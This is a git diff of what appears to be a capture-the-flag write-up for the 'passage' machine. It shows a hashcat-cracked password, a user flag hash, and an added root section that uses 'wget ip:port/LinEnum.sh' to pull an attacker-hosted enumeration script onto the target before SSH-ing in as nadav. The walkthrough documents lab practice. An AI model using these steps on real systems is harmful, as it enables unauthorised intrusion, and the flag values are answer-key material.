@@ -211,7 +211,7 @@ e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
 
 Using hashcat, the decoded password is `atlanta1'. 
 
-## Winning
+## Winning:
 
 ```
 su paul
@@ -220,3 +220,25 @@ cat user.txt
 
 Flag: *39158dd24ee425a84a4206f3d92ceb53*
 
+## Getting Root:
+
+We again host LinEnum on a SimpleHTTPServer and use wget to get the file.
+
+
+```
+wget ip:port/LinEnum.sh
+```
+
+After running LinEnum again, there does not seem to be anything important, so we check the home directory.
+
+We open the hidden directory *.ssh*, and find that there is an authorized keys file. In there is an authorized key for nadav.
+
+```
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
+```
+
+We then ssh into nadav. 
+
+```
+ssh nadav@passage.htb
+```
